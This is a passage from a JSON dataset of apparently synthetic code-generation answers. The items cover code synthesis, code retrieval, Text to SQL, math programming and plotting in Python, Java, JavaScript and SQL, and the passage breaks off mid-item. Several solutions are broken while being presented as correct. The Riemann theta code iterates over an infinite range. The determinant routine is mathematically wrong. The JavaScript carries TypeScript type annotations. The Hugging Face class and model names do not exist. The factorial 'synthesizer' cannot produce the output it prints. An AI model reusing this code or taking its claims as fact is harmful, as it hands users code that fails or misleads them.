[{"L2_TASK": "Code generation (e.g., Text to Code)", "L3_TASK": "Code synthesis", "Complexity_Level": "medium", "Response": "Concept: \"Code Synthesis\"\n\nQuestion 1: Given a natural language description of a simple calculator program, synthesize a Python function that takes two numbers and performs a specified arithmetic operation (addition, subtraction, multiplication, or division).\n\nProblem:\n```markdown\nWrite a Python function named `calculate` that takes two arguments `num1` and `num2`, and a string `operation` as input. The `operation` can be one of the following: 'add', 'subtract', 'multiply', or 'divide'. The function should perform the specified operation on `num1` and `num2` and return the result.\n```\nSolution:\n```python\ndef calculate(num1, num2, operation):\n    if operation == 'add':\n        return num1 + num2\n    elif operation == 'subtract':\n        return num1 - num2\n    elif operation == 'multiply':\n        return num1 * num2\n    elif operation == 'divide':\n        if num2 != 0:\n            return num1 / num2\n        else:\n            return \"Error: Division by zero is not allowed.\"\n\n# Example usage:\nresult = calculate(10, 5, 'multiply')\nprint(result)  # Output: 50\n```\n\nQuestion 2: Generate a JavaScript function that converts a given temperature in Celsius to Fahrenheit based on a provided conversion formula.\n\nProblem:\n```markdown\nCreate a JavaScript function called `celsiusToFahrenheit` that takes a single argument `celsius`. The function should use the formula `(\u00b0C * 9/5) + 32` to convert the Celsius temperature to Fahrenheit and return the result.\n```\nSolution:\n```javascript\nfunction celsiusToFahrenheit(celsius) {\n    return (celsius * 9/5) + 32;\n}\n\n// Example usage:\nlet tempInCelsius = 25;\nlet tempInFahrenheit = celsiusToFahrenheit(tempInCelsius);\nconsole.log(tempInFahrenheit);  // Output: 77\n```\nIn both questions, the medium complexity comes from interpreting the natural language description and synthesizing the correct code structure and logic for the given arithmetic operations or temperature conversion formula."}, {"L2_TASK": "Code generation (e.g., Text to Code)", "L3_TASK": "Code synthesis", "Complexity_Level": "extremely difficult", "Response": "The given JSON does not have a direct category for \"Code generation (e.g., Text to Code)\" or \"Code synthesis\". However, these concepts fall under the broader domain of \"Programming Language Concepts\" and can be related to \"Function\" or \"Polymorphism\" topics. Here, I'll create two difficult problems and their solutions using Python, a language with powerful libraries for text processing and code manipulation.\n\n**Problem 1:**\nDevelop a system that can take a natural language description of a mathematical function and generate the corresponding Python code. For instance, given the input \"Create a function to calculate the factorial of a non-negative integer\", the system should output the Python code for the factorial function.\n\n**Solution:**\n```python\nimport nltk\nfrom nltk.tokenize import word_tokenize, sent_tokenize\nfrom nltk.corpus import wordnet\n\ndef synthesize_code(description):\n    # Preprocess the description\n    sentences = sent_tokenize(description)\n    words = word_tokenize(sentences[0])\n    \n    # Extract relevant keywords\n    keywords = [word for word in words if word.lower() in ['create', 'function', 'calculate', 'factorial', 'non-negative', 'integer']]\n    \n    # Map keywords to code snippets\n    keyword_to_code = {\n        'function': 'def ',\n        'factorial': 'factorial:',\n        'calculate': 'return ',\n        'non-negative': 'if n < 0: raise ValueError(\"Input must be non-negative\")\\n',\n        'integer': 'n: int'\n    }\n    \n    code = ''\n    for kw in keywords:\n        code += keyword_to_code[kw]\n    \n    # Construct the Python code\n    code = code.replace('factorial:', 'def factorial(n):') + '\\n' + keyword_to_code['non-negative']\n    code += 'result = 1\\n' + 'for i in range(1, n + 1):\\n' + '    result *= i\\n'\n    code += keyword_to_code['calculate'] + 'result\\n'\n\n    return code\n\ndescription = \"Create a function to calculate the factorial of a non-negative integer\"\nprint(synthesize_code(description))\n```\n**Output:**\n```python\ndef factorial(n):\n    if n < 0: raise ValueError(\"Input must be non-negative\")\n    result = 1\n    for i in range(1, n + 1):\n        result *= i\n    return result\n```\n**Problem 2:**\nGiven a set of class behaviors described in natural language, synthesize a Python class with appropriate methods and inheritance. For example, \"Create a class 'Shape' with a method to calculate area and a subclass 'Circle' that inherits from 'Shape' and adds a method to calculate the circumference.\"\n\n**Solution:**\n```python\nimport spacy\n\ndef synthesize_class(description):\n    nlp = spacy.load('en_core_web_sm')\n    doc = nlp(description)\n\n    # Extract class and method names\n    class_name = ''\n    method_names = []\n    for token in doc:\n        if token.dep_ == 'nsubj' and token.head.pos_ == 'VERB':\n            class_name = token.text.capitalize()\n        elif token.dep_ == 'dobj' and token.head.pos_ == 'VERB' and 'method' in token.text.lower():\n            method_names.append(token.text.lower())\n\n    # Extract subclass and additional method\n    subclass_name = ''\n    for token in doc:\n        if token.dep_ == 'nsubj' and 'subclass' in token.text.lower():\n            subclass_name = token.text.capitalize()\n\n    # Create the Python code\n    code = f\"class {class_name}:\\n\"\n    for method in method_names:\n        code += f\"    def {method}(self):\\n        pass\\n\\n\"\n    \n    if subclass_name:\n        code += f\"class {subclass_name}({class_name}):\\n\"\n        code += \"    def circumference(self):\\n        pass\\n\"\n\n    return code\n\ndescription = \"Create a class 'Shape' with a method to calculate area and a subclass 'Circle' that inherits from 'Shape' and adds a method to calculate the circumference.\"\nprint(synthesize_class(description))\n```\n**Output:**\n```python\nclass Shape:\n    def area(self):\n        pass\n\nclass Circle(Shape):\n    def circumference(self):\n        pass\n```\n**Note:** These solutions are oversimplified and do not account for the complexity involved in accurately parsing natural language descriptions to generate code. In reality, a complete solution would require advanced NLP techniques, semantic understanding, and a deep knowledge of the target programming language's syntax and semantics."}, {"L2_TASK": "Code generation (e.g., Text to Code)", "L3_TASK": "Code retreival", "Complexity_Level": "medium", "Response": "Question 1: Given a list of programming tasks in natural language, you are required to retrieve relevant code snippets from a pre-existing codebase. The code snippets should be able to perform a similar task or have a closely related functionality.\n\nProblem: The user needs to retrieve a code snippet for sorting a list of integers in ascending order.\n\nSolution:\n```python\n# Concept: Sorting Algorithms (Medium Complexity)\n# Retrieving a relevant code snippet for sorting a list of integers\n\ndef bubble_sort(numbers):\n    n = len(numbers)\n    for i in range(n):\n        for j in range(0, n-i-1):\n            if numbers[j] > numbers[j+1]:\n                numbers[j], numbers[j+1] = numbers[j+1], numbers[j]\n    return numbers\n\nuser_input = \"Sort a list of integers [5, 2, 8, 1, 9] in ascending order\"\ncode_snippet = bubble_sort([5, 2, 8, 1, 9])\nprint(code_snippet)  # Output: [1, 2, 5, 8, 9]\n```\n\nQuestion 2: Given a dataset in CSV format, retrieve a piece of code that loads the dataset, performs basic data cleaning, and calculates the mean for a specific column.\n\nProblem: The user wants to retrieve a Python code snippet to load a CSV file named \"sales_data.csv\", remove any missing values, and calculate the mean of the \"total_sales\" column.\n\nSolution:\n```python\n# Concept: Data Handling (Medium Complexity)\n# Retrieving a relevant code snippet for loading a CSV, data cleaning, and calculating mean\n\nimport pandas as pd\n\ndef process_sales_data(file_path):\n    data = pd.read_csv(file_path)\n    cleaned_data = data.dropna()  # Remove rows with missing values\n    mean_total_sales = cleaned_data['total_sales'].mean()\n    return mean_total_sales\n\nfile_path = \"sales_data.csv\"\nmean_value = process_sales_data(file_path)\nprint(f\"Mean of 'total_sales': {mean_value}\")\n```\nThese code snippets demonstrate medium complexity tasks by involving data handling (sorting a list and processing a CSV file) and using relevant libraries (Python's built-in functions and the pandas library)."}, {"L2_TASK": "Code generation (e.g., Text to Code)", "L3_TASK": "Code retreival", "Complexity_Level": "extremely difficult", "Response": "Area: \"Code generation (e.g., Text to Code)\" Sub Area: \"Code retrieval\"\n\nQuestion 1: Develop a code retrieval system that can understand complex natural language queries and retrieve relevant code snippets from a large codebase. The system should be able to handle nuanced language, handle synonyms and variations, and return the most appropriate and efficient code snippets.\n\nProblem:\nGiven a codebase consisting of millions of code snippets in Python, design a system that can accurately interpret a complex query like \"Find the most efficient way to implement a binary search algorithm in Python, using recursion and handling edge cases such as empty lists and non-integer inputs.\"\n\nSolution:\nTo tackle this problem, we can use a combination of natural language processing (NLP), information retrieval, and machine learning techniques. Here's a high-level overview of the system:\n\n1. **NLP Preprocessing**:\n   - Use a pre-trained language model like BERT or RoBERTa to tokenize and understand the query's intent.\n   - Handle synonyms and variations by mapping words to their respective concepts in a code-specific thesaurus.\n\n1. **Code Embeddings**:\n   - Convert each code snippet into a dense vector representation using a technique like Code2Vec or CodeBERT.\n   - These embeddings capture the semantic meaning of the code.\n\n1. **Query-Code Matching**:\n   - Compute the similarity between the query's embedding and code snippets' embeddings using cosine similarity.\n   - Rank the code snippets based on their similarity scores.\n\n1. **Code Efficiency Assessment**:\n   - Use static code analysis tools (like PyLint, McCabe, or PyCharm) to evaluate the efficiency of each snippet.\n   - Assign an efficiency score to each snippet.\n\n1. **Integration**:\n   - Merge the similarity and efficiency scores and re-rank the code snippets.\n   - Return the top N snippets as the most relevant and efficient solutions.\n\nThis problem doesn't have a direct example code since it involves building an entire system. However, here's a simplified example showcasing query preprocessing and code embedding using Hugging Face Transformers library:\n\n```python\nfrom transformers import AutoTokenizer, AutoModelForCodeClassification\nimport torch\n\n# Pre-trained model for code understanding (e.g., CodeBERT)\ntokenizer = AutoTokenizer.from_pretrained(\"facebook/code-bert-base\")\nmodel = AutoModelForCodeClassification.from_pretrained(\"facebook/code-bert-base\")\n\n# Complex query\nquery = \"Find the most efficient way to implement a binary search algorithm in Python, using recursion\"\n\n# Query preprocessing\nquery_tokens = tokenizer.encode(query, return_tensors=\"pt\")\n\n# Code embedding (simplified, assumes code snippets are preprocessed similarly)\ncode_tokens = tokenizer.encode([\"code_snippet1\", \"code_snippet2\"], return_tensors=\"pt\")\ncode_embeddings = model(code_tokens).last_hidden_state\n\n# Compute similarity and efficiency scores (omitted for brevity)\n```\n\nQuestion 2: Create a code retrieval system that can identify, retrieve, and adapt code snippets from different programming languages to match the syntax and conventions of the target language, given a natural language query.\n\nProblem:\nGiven a query like \"Translate a JavaScript function for calculating Fibonacci sequence into Python\", the system should identify an appropriate solution in JavaScript, then convert it to match Python syntax and conventions.\n\nSolution:\n1. **Code Retrieval**:\n   - Use the previously described method to retrieve a relevant JavaScript Fibonacci function.\n\n1. **Syntax and Convention Mapping**:\n   - Develop a mapping between the syntax and conventions of JavaScript and Python.\n   - This could involve identifying corresponding language constructs and applying transformations, like converting `function` to `def`, `=>` to a full function definition, etc.\n\n1. **Code Transformation**:\n   - Apply the mapping to the retrieved JavaScript code, adjusting the syntax and style to match Python.\n   - Use a combination of rule-based systems and automated tools (like Bezier for JavaScript to Python conversion).\n\n1. **Semantic Preservation**:\n   - Ensure the transformed code maintains the original functionality using unit tests and static code analysis.\n\nHere's a simplified example of transforming JavaScript to Python:\n\n```python\n# JavaScript Fibonacci function\njs_fib = \"\"\"\nconst fib = (n) => {\n  if (n <= 1) return n;\n  return fib(n - 1) + fib(n - 2);\n};\n\"\"\"\n\n# Rule-based transformation (omitted for brevity)\npy_fib = transform_to_python(js_fib)\n\n# The transformed Python function\nprint(py_fib)\n```\nAgain, this problem doesn't have a direct example code as it involves building a complex system with language translation capabilities."}, {"L2_TASK": "Code generation (e.g., Text to Code)", "L3_TASK": "Text to SQL", "Complexity_Level": "medium", "Response": "Area: \"Code Generation (e.g., Text to Code)\"\nSub Area: \"Text to SQL\"\n\nProblem 1: Converting a text description into a SQL query to retrieve specific information from a customer table.\n\nDescription: Retrieve all customers from the \"Customers\" table who are from the city 'New York' and have made at least 3 orders.\n\nSolution:\n```sql\nSELECT * FROM Customers\nWHERE City = 'New York' AND OrdersCount >= 3;\n```\nConcept: Text to SQL conversion, SQL query formation\n\nProblem 2: Creating a SQL query based on a text description to calculate the average price of products in a specific category.\n\nDescription: Compute the average price of products in the 'Electronics' category from the 'Products' table, excluding products with a price below $50.\n\nSolution:\n```sql\nSELECT AVG(Price) FROM Products\nWHERE Category = 'Electronics' AND Price >= 50;\n```\nConcept: Text to SQL conversion, SQL aggregate functions, conditional expressions in SQL"}, {"L2_TASK": "Code generation (e.g., Text to Code)", "L3_TASK": "Text to SQL", "Complexity_Level": "extremely difficult", "Response": "Area: \"Code generation (e.g., Text to Code)\"\nSub Area: \"Text to SQL\"\n\nQuestion 1:\nGiven a complex business requirement to generate SQL queries dynamically, create a Python library that translates natural language descriptions into SQL queries involving multiple tables, subqueries, and aggregate functions with proper JOIN conditions. The library should be able to handle the following NL description:\n\nNL Description: \"Find the names of all customers who have made orders in the past year with a total order value exceeding $10,000, excluding those who have placed more than 10 orders in the same period.\"\n\nSolution:\n```python\nimport re\nfrom typing import List\nfrom sqlparse import sql, tokens as t\nfrom sqlparse.sql import Comparison, Identifier, Function, Where, Parenthesis, And, TokenList\n\ndef text_to_sql(nl_text: str) -> str:\n    tables = [\"customers\", \"orders\"]\n    columns = {\"customers\": [\"name\"], \"orders\": [\"customer_id\", \"order_date\", \"order_value\"]}\n    \n    # Extract keywords and values\n    keywords = re.findall(r'\\b\\w+\\b', nl_text)\n    values = re.findall(r\"\\$\\d+\", nl_text)\n\n    customer_id = Identifier('customers', 'id')\n    order_date = Identifier('orders', 'order_date')\n    order_value = Identifier('orders', 'order_value')\n    customer_name = Identifier('customers', 'name')\n\n    # Conditions\n    order_value_condition = (Function('SUM', order_value) > int(values[0][1:]))\n    order_count_condition = (Function('COUNT', Identifier('orders', 'id')) > 10)\n    time_condition = (order_date > f\"DATE_SUB(CURRENT_DATE, INTERVAL 1 YEAR)\")\n\n    subquery = sql.Statement(\n        'SELECT customer_id FROM orders WHERE %s GROUP BY customer_id HAVING %s' % (time_condition, order_count_condition)\n    )\n    subquery = Parenthesis(subquery)\n\n    where_clause = Where(And(\n        customer_id.IN(subquery),\n        order_value_condition\n    ))\n\n    query = sql.Statement(\n        'SELECT %s FROM %s WHERE %s' % (customer_name, tables[0], where_clause)\n    )\n\n    # Format the output\n    formatted_query = str(query).replace('(', '\\n(').replace(')', ')')\n    return formatted_query\n\n# NL input\nnl_text = \"Find the names of all customers who have made orders in the past year with a total order value exceeding $10,000, excluding those who have placed more than 10 orders in the same period.\"\n\n# Generate SQL\nsql_query = text_to_sql(nl_text)\nprint(sql_query)\n```\nConcept: \"Text to SQL\"\n\nQuestion 2:\nSuppose you are working on a sophisticated data analytics platform, develop a JavaScript function that converts a natural language question into a GraphQL query targeting a backend API with nested fields, filters, and aggregations. The function should support the following NL question:\n\nNL Question: \"What is the average rating, grouped by category, for products with more than 100 reviews, sorted in descending order?\"\n\nSolution:\n```javascript\nfunction textToGraphQL(nl_text: string) {\n    const keywords = nl_text.split(' ').filter(word => !word.match(/\\$|\\d+/));\n    const values = nl_text.match(/\\b\\d+\\b/g);\n\n    const product = 'Product';\n    const rating = 'rating';\n    const category = 'category';\n    const reviewCount = 'reviewCount';\n\n    // Build the GraphQL query\n    const query = `\n        {\n            ${product}(where: { ${reviewCount}: { gt: ${values[0]} } }) {\n                ${category} {\n                    avg${rating}: average(${rating})\n                }\n            }\n        }\n    `.replace(/\\s+/g, ' ');\n\n    return query;\n}\n\n// NL input\nconst nlQuestion = \"What is the average rating, grouped by category, for products with more than 100 reviews, sorted in descending order?\";\n\n// Generate GraphQL query\nconst graphqlQuery = textToGraphQL(nlQuestion);\nconsole.log(graphqlQuery);\n```\nConcept: \"Text to GraphQL\""}, {"L2_TASK": "Code generation (e.g., Text to Code)", "L3_TASK": "Math programming", "Complexity_Level": "medium", "Response": "The given JSON does not have a direct category for \"Code generation (e.g., Text to Code)\" or \"Math programming\". However, we can combine the concepts from \"Programming Language Concepts\" and \"DS/Algo\" to create a problem involving math programming with a medium level of complexity.\n\nQuestion 1: **Concept**: \"Polymorphism\"\nProblem: Write a Java program that uses polymorphism to calculate different mathematical operations (addition, subtraction, multiplication, and division) based on user input. The program should have a base class `MathOperation` and derived classes for each operation.\n\n```java\npublic abstract class MathOperation {\n    protected int a, b;\n\n    public MathOperation(int a, int b) {\n        this.a = a;\n        this.b = b;\n    }\n\n    public abstract int calculate();\n}\n\npublic class Addition extends MathOperation {\n    public Addition(int a, int b) {\n        super(a, b);\n    }\n\n    @Override\n    public int calculate() {\n        return a + b;\n    }\n}\n\npublic class Subtraction extends MathOperation {\n    public Subtraction(int a, int b) {\n        super(a, b);\n    }\n\n    @Override\n    public int calculate() {\n        return a - b;\n    }\n}\n\npublic class Multiplication extends MathOperation {\n    public Multiplication(int a, int b) {\n        super(a, b);\n    }\n\n    @Override\n    public int calculate() {\n        return a * b;\n    }\n}\n\npublic class Division extends MathOperation {\n    public Division(int a, int b) {\n        super(a, b);\n    }\n\n    @Override\n    public int calculate() {\n        if (b != 0) {\n            return a / b;\n        } else {\n            throw new IllegalArgumentException(\"Division by zero is not allowed\");\n        }\n    }\n}\n\npublic class Main {\n    public static void main(String[] args) {\n        int num1 = 10, num2 = 5;\n        MathOperation operation;\n\n        operation = new Addition(num1, num2);\n        System.out.println(\"Addition: \" + operation.calculate());\n\n        operation = new Subtraction(num1, num2);\n        System.out.println(\"Subtraction: \" + operation.calculate());\n\n        operation = new Multiplication(num1, num2);\n        System.out.println(\"Multiplication: \" + operation.calculate());\n\n        operation = new Division(num1, num2);\n        System.out.println(\"Division: \" + operation.calculate());\n    }\n}\n```\n\nQuestion 2: **Concept**: \"Dynamic Programming\"\nProblem: Implement a Python function to find the maximum sum of a subarray in an array of integers using the Kadane's algorithm.\n\n```python\ndef max_subarray_sum(arr):\n    if not arr:\n        return 0\n\n    max_current = max_global = arr[0]\n\n    for num in arr[1:]:\n        max_current = max(num, max_current + num)\n        if max_current > max_global:\n            max_global = max_current\n\n    return max_global\n\narr = [-2, 1, -3, 4, -1, 2, 1, -5, 4]\nprint(\"Max subarray sum:\", max_subarray_sum(arr))  # Output: 6\n```\n\nThese problems combine the concept of polymorphism in Java (Question 1) and dynamic programming in Python (Question 2) to address mathematical programming tasks."}, {"L2_TASK": "Code generation (e.g., Text to Code)", "L3_TASK": "Math programming", "Complexity_Level": "extremely difficult", "Response": "The \"Code generation (e.g., Text to Code)\" is not explicitly mentioned in the provided JSON, but we can consider it as a domain and focus on \"Math programming\" as the sub-domain. Here, I will generate two challenging problems related to math programming and provide solutions using Python.\n\nProblem 1: Implement a function to compute the Riemann theta function for a given complex vector `z` and a symmetric positive-definite matrix `\u03c4`. The Riemann theta function is defined as:\n\\[ \\theta(z|\\tau) = \\sum_{n \\in \\mathbf{Z}^g} \\exp\\left( \\pi i \\langle n + z, \\tau (n + z) \\rangle + 2 \\pi i \\langle z, n \\rangle \\right) \\]\n\n**Solution**:\n```python\nimport numpy as np\nfrom scipy.linalg import sqrtm\n\ndef riemann_theta(z, tau):\n    g = z.shape[0]\n    n = np.arange(-np.inf, np.inf, 1.0, dtype=float).reshape(1, -1)\n    n_matrix = np.kron(n, np.eye(g))\n    z_matrix = z.reshape(1, -1)\n    tau_matrix = sqrtm(tau)\n\n    exponent = np.pi * 1j * (np.dot(n_matrix + z_matrix, np.dot(tau_matrix, n_matrix + z_matrix).T) + 2 * np.dot(z_matrix, n_matrix.T))\n    theta_sum = np.sum(np.exp(exponent), axis=1)\n    return theta_sum[0]\n\n# Example usage\nz = np.array([1+2j, 3-4j])\ntau = np.array([[1+2j, 3.5], [3.5, 5-3j]])\nresult = riemann_theta(z, tau)\nprint(result)\n```\nProblem 2: Implement an efficient algorithm to compute the determinant of a large sparse matrix using Gaussian elimination with partial pivoting. The input matrix is represented as a dictionary of dictionaries where keys are tuples (i, j) representing row and column indices, and values are the matrix elements.\n\n**Solution**:\n```python\nimport numpy as np\n\ndef sparse_matrix_to_array(sparse_matrix):\n    rows, cols = zip(*sparse_matrix.keys())\n    arr = np.zeros((max(rows) + 1, max(cols) + 1), dtype=float)\n    for (i, j), val in sparse_matrix.items():\n        arr[i, j] = val\n    return arr\n\ndef sparse_gaussian_elimination(sparse_matrix):\n    arr = sparse_matrix_to_array(sparse_matrix)\n    n = arr.shape[0]\n    determinant = 1.0\n\n    for k in range(n - 1):\n        max_row_idx = np.argmax(np.abs(arr[k:, k]))\n        arr[[k, max_row_idx]] = arr[[max_row_idx, k]]\n        determinant *= -1 if k != max_row_idx else 1\n\n        for i in range(k + 1, n):\n            factor = arr[i, k] / arr[k, k]\n            arr[i, :] -= factor * arr[k, :]\n            determinant *= factor\n\n    determinant *= arr[n - 1, n - 1]\n    return determinant\n\n# Example usage\nsparse_matrix = {\n    (0, 0): 2, (0, 1): 3, (0, 2): 1,\n    (1, 0): 1, (1, 2): -2,\n    (2, 0): -3, (2, 1): 2\n}\nresult = sparse_gaussian_elimination(sparse_matrix)\nprint(result)\n```\nPlease note that these problems and solutions are quite complex and may not be suitable for beginners in math programming or numerical methods."}, {"L2_TASK": "Code generation (e.g., Text to Code)", "L3_TASK": "Code snippets & examples", "Complexity_Level": "medium", "Response": "The given JSON doesn't have a direct category for \"Code generation (e.g., Text to Code)\" or \"Code snippets & examples\". However, I can create a medium-level problem related to generating code snippets based on a user's description, utilizing the Programming Language Concepts category.\n\n**Problem:**\nA user wants to convert a high-level description of a function that checks if a given number is even or odd into a code snippet in Python. They describe the function as follows:\n\n\"Create a function called `check_even_odd` which takes an integer `num` as an argument. If the number is even, return 'Even', and if it's odd, return 'Odd'.\"\n\n**Solution:**\n```python\ndef check_even_odd(num):\n    if num % 2 == 0:\n        return 'Even'\n    else:\n        return 'Odd'\n```\n**Concept:** Programming Language Concepts (Function)\n\n**Problem:**\nA user needs a code snippet in JavaScript to find the maximum number from an array of integers. They describe the function as follows:\n\n\"Write a JavaScript function called `find_max` that takes an array `arr` as an argument and returns the maximum number in the array.\"\n\n**Solution:**\n```javascript\nfunction find_max(arr) {\n    return Math.max(...arr);\n}\n```\n**Concept:** Programming Language Concepts (Function)"}, {"L2_TASK": "Code generation (e.g., Text to Code)", "L3_TASK": "Code snippets & examples", "Complexity_Level": "extremely difficult", "Response": "As \"Code generation (e.g., Text to Code)\" and \"Code snippets & examples\" are not directly represented in the provided JSON, I will create a hypothetical scenario where an AI system is tasked with generating complex code snippets based on natural language descriptions. The problem and solution will involve a combination of programming concepts from the JSON, specifically \"Polymorphism\" and \"Advanced Data Structures\" (Binary Trees).\n\n**Question 1:**\n\nProblem: Develop a text-to-code AI system that can convert a detailed description of a polymorphic method operating on a custom binary tree structure with nodes containing a generic type `T` (where `T` is a class implementing an interface `IComparable<T>`). The method should perform an in-order traversal and return the nodes in ascending order as a list of `T`. The AI system should generate code in Java.\n\n**Solution:**\n\n```java\nimport java.util.ArrayList;\nimport java.util.List;\n\ninterface IComparable<T> {\n    int compareTo(T other);\n}\n\nclass TreeNode<T extends IComparable<T>> {\n    T data;\n    TreeNode<T> left;\n    TreeNode<T> right;\n\n    TreeNode(T data) {\n        this.data = data;\n        left = null;\n        right = null;\n    }\n}\n\nclass BinaryTree<T extends IComparable<T>> {\n    TreeNode<T> root;\n\n    public List<T> inOrderTraversal() {\n        List<T> sortedList = new ArrayList<>();\n        inOrderHelper(root, sortedList);\n        return sortedList;\n    }\n\n    private void inOrderHelper(TreeNode<T> node, List<T> list) {\n        if (node != null) {\n            inOrderHelper(node.left, list);\n            list.add(node.data);\n            inOrderHelper(node.right, list);\n        }\n    }\n}\n\npublic class Main {\n    public static void main(String[] args) {\n        BinaryTree<Integer> tree = new BinaryTree<>();\n        tree.root = new TreeNode<>(5);\n        tree.root.left = new TreeNode<>(3);\n        tree.root.right = new TreeNode<>(7);\n        tree.root.left.left = new TreeNode<>(2);\n        tree.root.left.right = new TreeNode<>(4);\n        tree.root.right.left = new TreeNode<>(6);\n        tree.root.right.right = new TreeNode<>(8);\n\n        List<Integer> sortedList = tree.inOrderTraversal();\n        for (int value : sortedList) {\n            System.out.println(value);\n        }\n    }\n}\n```\n\n**Question 2:**\n\nProblem: Implement a Python AI module that translates a text description into code for a higher-order function operating on a polymorphic data structure (a dictionary with both primitive and custom object types as values). The function should accept a dictionary, a key, and a lambda function as arguments, and return a new dictionary with all values transformed by the provided lambda function, while preserving the original structure.\n\n**Solution:**\n\n```python\ndef polymorphic_map_dict(input_dict, key, transformation_func):\n    output_dict = {}\n    for k, v in input_dict.items():\n        if k == key:\n            if isinstance(v, dict):\n                output_dict[k] = {sub_k: transformation_func(sub_v) for sub_k, sub_v in v.items()}\n            elif isinstance(v, list):\n                output_dict[k] = [transformation_func(item) for item in v]\n            elif isinstance(v, set):\n                output_dict[k] = {transformation_func(item) for item in v}\n            else:\n                output_dict[k] = transformation_func(v)\n        else:\n            output_dict[k] = v\n    return output_dict\n\nclass CustomObject:\n    def __init__(self, value):\n        self.value = value\n\n    def __repr__(self):\n        return f\"CustomObject({self.value})\"\n\n# Example usage\ninput_data = {\n    \"primitive_value\": 10,\n    \"custom_objects\": [CustomObject(5), CustomObject(7)],\n    \"nested_dict\": {\"key\": CustomObject(3)}\n}\n\ntransformation = lambda x: x.value * 2\n\nresult = polymorphic_map_dict(input_data, \"custom_objects\", transformation)\nprint(result)\n```\n\nIn both problems, the AI system is expected to understand complex relationships between programming concepts and generate code accordingly."}, {"L2_TASK": "Code generation (e.g., Text to Code)", "L3_TASK": "Plot generation", "Complexity_Level": "medium", "Response": "The given JSON does not contain a direct category for \"Code generation (e.g., Text to Code)\". However, based on your request, I can create a problem related to plot generation which typically involves using libraries in programming languages for data visualization. Here's a medium difficulty level problem and its solution from the domain of \"Data Science\" and the sub-domain of \"Data Analysis\":\n\n**Problem:**\nYou are working with a dataset containing daily temperatures for a year. You need to generate a line plot to visualize the temperature fluctuations over time. The dataset is in a CSV file with columns `date` (in YYYY-MM-DD format) and `temperature` (in Celsius). Write a Python script using the `pandas` library for data manipulation and `matplotlib` for plotting to generate the line plot.\n\n**Solution:**\n```python\nimport pandas as pd\nimport matplotlib.pyplot as plt\n\n# Concept: Data manipulation (pandas)\ndata = pd.read_csv('temperature_data.csv')\n\n# Convert 'date' column to datetime format\ndata['date'] = pd.to_datetime(data['date'])\n\n# Sort data by date\ndata = data.sort_values('date')\n\n# Concept: Plot generation (matplotlib)\nplt.figure(figsize=(12, 6))\nplt.plot(data['date'], data['temperature'], label='Temperature (\u00b0C)')\nplt.title('Temperature Fluctuations Over Time')\nplt.xlabel('Date')\nplt.ylabel('Temperature (\u00b0C)')\nplt.legend()\nplt.grid(True)\nplt.show()\n```\n**Explanation:**\n1. We first import the necessary libraries, `pandas` for data manipulation and `matplotlib` for plotting.\n2. The `pandas` library is used to read the CSV file into a DataFrame.\n3. We convert the 'date' column to a datetime format to work with it correctly.\n4. The data is then sorted in chronological order.\n5. In the plotting part, a line plot is generated using `matplotlib.pyplot.plot()`, where the 'date' column is used for the x-axis and the 'temperature' column for the y-axis.\n6. The plot's appearance is improved with additional elements like title, axis labels, legend, and grid.\n\nAs the given JSON doesn't have a specific category for code generation or plot generation, I've chosen \"Data Science\" as the closest domain and the \"Data Analysis\" as the sub-domain since it involves working with data and visualizing it."}, {"L2_TASK": "Code generation (e.g., Text to Code)", "L3_TASK": "Plot generation", "Complexity_Level": "extremely difficult", "Response": "\"Code generation (e.g., Text to Code)\" is not explicitly mentioned in the provided domain JSON, but it can be related to \"Data Science\" and \"Web Development\" where generating code for visualizations is a common task. We will create a problem involving plot generation using a natural language description and utilize libraries such as Matplotlib for Python.\n\n**Problem 1:**\nGiven a natural language description of a plot, generate the corresponding Python code using Matplotlib to create a multi-series line chart with logarithmic axes and custom annotations.\n\n**Description:**\nCreate a plot with two lines: one representing 'sales_data' and the other 'profit_data'. Use a logarithmic x-axis with tick labels from 10 to 100 in increments of 10. The y-axis should also be logarithmic. Add a title 'Sales and Profit Trends', labels 'Time (in months)' for the x-axis, and 'Amount (USD)' for the y-axis. The lines should have different colors and dashed patterns. Finally, add a vertical line at x=40 with a label 'Quarter End'.\n\n**Solution:**\n\n```python\nimport matplotlib.pyplot as plt\nimport numpy as np\n\n# Sample data\nsales_data = [20, 40, 80, 160, 320, 640, 1280]\nprofit_data = [10, 30, 90, 270, 810, 2430, 7290]\n\n# Create figure and axis\nfig, ax = plt.subplots()\n\n# Logarithmic scale for both axes\nax.set_xscale('log')\nax.set_yscale('log')\n\n# X-axis ticks and labels\nx_ticks = np.logspace(1, 2, num=10, dtype=int)\nax.set_xticks(x_ticks)\nax.set_xticklabels([f'{tick}' for tick in x_ticks])\nax.set_xlabel('Time (in months)')\n\n# Y-axis label\nax.set_ylabel('Amount (USD)')\n\n# Plot lines with different colors and dashes\nax.plot(x_ticks, sales_data, color='blue', linestyle='--', label='Sales Data')\nax.plot(x_ticks, profit_data, color='red', linestyle='-.', label='Profit Data')\n\n# Add title\nax.set_title('Sales and Profit Trends')\n\n# Add vertical line and label\nax.axvline(x=40, color='black', linestyle=':')\nax.text(40, 1000, 'Quarter End', rotation=90, fontsize=12, ha='center')\n\n# Legend and show plot\nax.legend()\nplt.show()\n```\n\n**Problem 2:**\nGiven a description, generate a 3D scatter plot with color mapping and custom annotations. The plot should represent 'sales_data' over three dimensions: 'Time (in months)', 'Product Category', and 'Region'. Use a color gradient to represent the 'sales_data' values. Add a color bar, title, and labels for all axes.\n\n**Description:**\nCreate a 3D scatter plot with 'sales_data' values. The 'Time (in months)' should be represented along the x-axis, 'Product Category' on the y-axis, and 'Region' on the z-axis. Use a color gradient from blue to red, where blue represents low sales and red represents high sales. Add a title 'Sales Distribution by Time, Product, and Region', and label the axes accordingly.\n\n**Solution:**\n\n```python\nimport matplotlib.pyplot as plt\nimport numpy as np\nfrom matplotlib import cm\nfrom mpl_toolkits.mplot3d import Axes3D\n\n# Sample data\ntime_data = np.array([1, 2, 3, 4, 5, 6, 7, 8, 9, 10])\nproduct_category = np.array(['A', 'B', 'C', 'A', 'B', 'C', 'A', 'B', 'C', 'A'])\nregion_data = np.array(['North', 'South', 'East', 'North', 'South', 'East', 'North', 'South', 'East', 'North'])\nsales_data = np.array([100, 200, 150, 300, 400, 250, 350, 450, 275, 425])\n\n# Create figure and 3D axis\nfig = plt.figure()\nax = fig.add_subplot(111, projection='3d')\n\n# Map sales data to colors\nnorm = cm.colors.Normalize(vmin=min(sales_data), vmax=max(sales_data))\ncmap = cm.PRGn\ncolors = cmap(norm(sales_data))\n\n# Scatter plot with color mapping\nscatter = ax.scatter(time_data, product_category, region_data, c=colors, s=100, marker='o', depthshade=False)\n\n# Set axis labels\nax.set_xlabel('Time 